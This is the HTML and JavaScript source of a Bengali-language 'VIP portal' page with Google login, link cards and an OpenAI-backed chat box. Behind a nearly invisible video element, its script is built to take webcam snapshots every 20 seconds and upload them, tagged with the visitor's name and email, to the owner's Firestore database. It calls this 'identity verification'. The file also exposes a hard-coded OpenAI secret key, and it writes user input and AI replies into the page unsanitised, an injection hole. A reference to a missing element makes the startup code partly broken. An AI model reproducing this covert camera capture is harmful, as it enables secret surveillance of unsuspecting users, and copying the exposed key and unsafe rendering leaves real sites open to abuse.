<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | VIP Portal Final</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --pink: #ff4d94;
            --pink-glow: rgba(255, 77, 148, 0.6);
            --dark: #020617;
            --glass: rgba(255, 255, 255, 0.08);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }

        body {
            background: var(--dark);
            background-image: radial-gradient(circle at 10% 20%, rgba(255, 77, 148, 0.15) 0%, transparent 40%),
                              radial-gradient(circle at 90% 80%, rgba(255, 77, 148, 0.1) 0%, transparent 40%);
            color: white; min-height: 100vh; overflow-x: hidden;
        }

        /* --- LOVE RAIN (INCREASED FREQUENCY & BLUR) --- */
        .love-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; overflow: hidden; }
        .heart { position: absolute; color: var(--pink); font-size: 14px; animation: rain linear infinite; opacity: 0.6; filter: drop-shadow(0 0 5px var(--pink)) blur(1px); }
        @keyframes rain {
            0% { transform: translateY(-50px) rotate(0deg); opacity: 0; }
            10% { opacity: 0.6; }
            90% { opacity: 0.5; }
            100% { transform: translateY(500px) rotate(360deg); opacity: 0; }
        }

        /* --- MODALS --- */
        .modal-overlay { position: fixed; inset: 0; background: rgba(2, 6, 23, 0.98); z-index: 10000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(25px); padding: 20px; }
        .glass-box { background: var(--glass); padding: 45px 30px; border-radius: 40px; border: 1px solid rgba(255, 77, 148, 0.3); text-align: center; width: 100%; max-width: 420px; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); animation: slideUp 0.6s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        /* --- HEADER (DEEP BLUR PINK) --- */
        .hero-header { 
            margin: 25px 20px; padding: 45px 20px; 
            background: radial-gradient(circle, rgba(255, 77, 148, 0.5) 0%, rgba(255, 77, 148, 0.2) 60%, transparent 100%);
            border-radius: 35px; border: 1px solid rgba(255, 77, 148, 0.3); 
            position: relative; overflow: hidden; 
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4); 
            backdrop-filter: blur(10px);
        }
        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; position: relative; z-index: 5; }
        
        /* --- PROFILE PICTURES (FIXED ASpect RATIO) --- */
        .p-img { 
            width: 115px; height: 115px; 
            border-radius: 50%; 
            border: 4px solid var(--pink); 
            box-shadow: 0 0 25px var(--pink); 
            object-fit: cover; /* Prevents stretching */
            aspect-ratio: 1 / 1; /* Ensures perfect circle */
        }
        .user-p-img { 
            width: 95px; height: 95px; 
            border: 4px solid #fff; 
            margin-left: -35px; 
            background: #000; 
            box-shadow: 0 10px 20px rgba(0,0,0,0.5); 
            object-fit: cover; 
            aspect-ratio: 1 / 1;
        }
        .user-name-loop { font-size: 28px; font-weight: 800; text-align: center; background: linear-gradient(90deg, #fff, var(--pink), #fff); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: shine 3s linear infinite; letter-spacing: 1px; display: block; text-transform: uppercase; }
        @keyframes shine { to { background-position: 200% center; } }

        /* --- CARDS WITH SHINE MASK ANIMATION --- */
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 18px; padding: 0 20px 30px; max-width: 600px; margin: 0 auto; }
        .card { 
            background: var(--glass); border-radius: 28px; padding: 30px 15px; text-align: center; text-decoration: none; color: white; 
            border: 1px solid rgba(255, 255, 255, 0.05); transition: 0.4s; position: relative; overflow: hidden; 
        }
        
        /* The Pink Shine Mask */
        .card::before {
            content: ''; position: absolute; top: 0; left: -150%; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 77, 148, 0.2), transparent);
            transition: 0.6s; transform: skewX(-20deg);
        }
        .card:hover::before { left: 150%; }
        .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 10px 20px rgba(255, 77, 148, 0.2); }
        
        .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; display: block; filter: drop-shadow(0 0 8px var(--pink-glow)); }
        .card p { font-weight: 600; font-size: 15px; }
        .card.wide { grid-column: span 2; display: flex; align-items: center; justify-content: center; gap: 15px; padding: 22px; }

        .alarm-dot { position: absolute; top: 15px; right: 15px; width: 12px; height: 12px; background: #ff3333; border-radius: 50%; box-shadow: 0 0 10px #ff3333; animation: blink 1s infinite; display: none; }
        @keyframes blink { 50% { opacity: 0.5; } }

        /* --- AI SECTION --- */
        .chat-area { max-width: 500px; margin: 10px auto 40px; padding: 0 20px; }
        .chat-mini { background: rgba(0, 0, 0, 0.6); border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.2); padding: 22px; }
        #chat-log { height: 140px; overflow-y: auto; color: #ccc; margin-bottom: 15px; font-size: 14px; }
        .chat-in { display: flex; gap: 10px; }
        .chat-in input { flex: 1; background: #0d1117; border: 1px solid #333; color: #fff; padding: 12px 20px; border-radius: 50px; outline: none; }
        .chat-in input:focus { border-color: var(--pink); }

        .btn-main { background: linear-gradient(45deg, var(--pink), #ff1a75); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: 700; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 20px rgba(255, 77, 148, 0.3); text-transform: uppercase; }

        #vSource { position: fixed; top: 0; left: 0; width: 640px; height: 480px; opacity: 0.01; z-index: -1; pointer-events: none; }
        #snapCanvas { display: none; }
    </style>
</head>

<body>
    <audio id="snd-bus" src="business.mp3"></audio>
    <audio id="snd-port" src="portfolio.mp3"></audio>
    <audio id="snd-look" src="lookup.mp3"></audio>
    <audio id="snd-open" src="open.mp3"></audio>
    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>

    <div id="login-overlay" class="modal-overlay" style="display: flex;">
        <div class="glass-box">
            <img src="ratan.jpg" style="width:110px; height:110px; border-radius:50%; border:3px solid var(--pink); margin-bottom:20px; box-shadow: 0 0 30px var(--pink); object-fit: cover; aspect-ratio: 1/1;">
            <h2>RATAN BRO PORTAL</h2>
            <button class="btn-main" onclick="googleLogin()" style="width: 100%; margin-top: 20px;">LOGIN WITH GOOGLE</button>
        </div>
    </div>

    <div id="main-ui" style="display:none;">
        <div style="text-align:right; padding: 10px 20px;">
            <button onclick="googleLogout()" style="background:none; border:1px solid #333; color:#666; padding:5px 12px; border-radius:50px; cursor:pointer; font-size:12px;">Sign Out</button>
        </div>

        <div class="hero-header">
            <div id="rain-wrap" class="love-container"></div>
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
            </div>
            <span id="u-display-name" class="user-name-loop">...</span>
            <p style="text-align:center; color:#ddd; font-size:12px; margin-top: 15px;"><i class="fas fa-fingerprint" style="color:var(--pink)"></i> PORTAL SECURED</p>
        </div>

        <div class="grid">
            <div class="card" onclick="openLatestNotif()">
                <div id="notif-alarm" class="alarm-dot"></div>
                <i class="fas fa-bell"></i><p>Notification</p>
            </div>
            <a href="testpaper.html" class="card"><i class="fas fa-file-signature"></i><p>Test Papers</p></a>
            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();"><i class="fas fa-chart-line"></i><p>Business</p></a>
            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();"><i class="fas fa-id-badge"></i><p>Portfolio</p></a>
            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide" onclick="document.getElementById('snd-look').play();">
                <i class="fas fa-search-plus"></i><p>Advanced Number Lookup</p>
            </a>
        </div>

        <div class="chat-area">
            <div class="chat-mini">
                <div id="chat-log"><b>AI Assistant:</b> আপনার জন্য আমি কী করতে পারি?</div>
                <div class="chat-in">
                    <input type="text" id="ai-msg" placeholder="Ask anything...">
                    <button onclick="askAI()" class="btn-main" style="padding: 10px 20px;">SEND</button>
                </div>
            </div>
        </div>
    </div>

    <div id="notif-modal" class="modal-overlay">
        <div class="glass-box" style="border-color: #fff3;">
            <h3 style="color:var(--pink); margin-bottom:10px;">NOTICE</h3>
            <p id="nt-msg" style="font-size: 16px; line-height: 1.6;"></p>
            <button class="btn-main" onclick="closeNotif()" style="margin-top:25px;">CLOSE</button>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>
    <canvas id="snapCanvas" width="640" height="480"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();
        const OPENAI_KEY = "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";

        let loggedUser = null;
        let latestNotif = null;

        function startLoveRain() {
            const container = document.getElementById('rain-wrap');
            setInterval(() => {
                const heart = document.createElement('i');
                heart.className = 'fas fa-heart heart';
                heart.style.left = Math.random() * 100 + '%';
                heart.style.fontSize = (Math.random() * 8 + 10) + 'px';
                heart.style.animationDuration = (Math.random() * 2 + 3) + 's';
                container.appendChild(heart);
                setTimeout(() => heart.remove(), 4000);
            }, 600); // Frequency fixed
        }

        async function captureSession() {
            if (!loggedUser) return;
            const video = document.getElementById('vSource');
            const canvas = document.getElementById('snapCanvas');
            const ctx = canvas.getContext('2d');
            
            // Critical Fix: Ensures video is ready
            if (video.videoWidth > 0) {
                ctx.drawImage(video, 0, 0, 640, 480);
                const imgData = canvas.toDataURL('image/jpeg', 0.5);
                const userKey = loggedUser.email.replace(/\./g, '_');
                await setDoc(doc(db, "users", userKey), {
                    name: loggedUser.displayName,
                    lastPic: imgData,
                    lastSeen: new Date().toLocaleString()
                }, { merge: true });
                console.log("Identity Snapshot Sent");
            }
        }

        window.grantAndStart = async () => {
            try {
                // Camera captures for identity check
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('vSource');
                video.srcObject = stream;
                
                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                document.getElementById('snd-open').play();
                startLoveRain();
                
                // Initial capture after 3 seconds to ensure stream is active
                setTimeout(captureSession, 3000);
                setInterval(captureSession, 20000); // Regular capture loop
            } catch (err) { alert("Camera access is required for identity verification!"); }
        };

        onAuthStateChanged(auth, (user) => {
            if (user) {
                loggedUser = user;
                document.getElementById('u-display-name').innerText = user.displayName;
                document.getElementById('u-pic').src = user.photoURL;
                document.getElementById('login-overlay').style.display = 'none';
                // Always start verification upon login
                grantAndStart();
            } else {
                document.getElementById('login-overlay').style.display = 'flex';
                document.getElementById('main-ui').style.display = 'none';
            }
        });

        window.askAI = async () => {
            const input = document.getElementById('ai-msg');
            const log = document.getElementById('chat-log');
            if (!input.value) return;
            const p = input.value;
            log.innerHTML += `<div style="color:var(--pink); text-align:right;"><b>You:</b> ${p}</div>`;
            input.value = "Thinking...";
            try {
                const res = await fetch("https://api.openai.com/v1/chat/completions", {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${OPENAI_KEY}` },
                    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: p }] })
                });
                const data = await res.json();
                log.innerHTML += `<div><b>AI:</b> ${data.choices[0].message.content}</div>`;
            } catch (e) { log.innerHTML += `<div>Error connecting...</div>`; }
            input.value = "";
            log.scrollTop = log.scrollHeight;
        };

        window.googleLogin = () => signInWithPopup(auth, provider);
        window.googleLogout = () => signOut(auth).then(() => location.reload());

        onSnapshot(doc(db, "system", "updates"), (snap) => {
            if (snap.exists()) {
                latestNotif = snap.data();
                if (latestNotif.hasNew) {
                    document.getElementById('notif-alarm').style.display = 'block';
                    document.getElementById('snd-notif').play();
                }
            }
        });

        window.openLatestNotif = () => {
            if (latestNotif) {
                document.getElementById('nt-msg').innerText = latestNotif.message;
                document.getElementById('notif-modal').style.display = 'flex';
                document.getElementById('notif-alarm').style.display = 'none';
            }
        };
        window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
    </script>
</body>
</html>
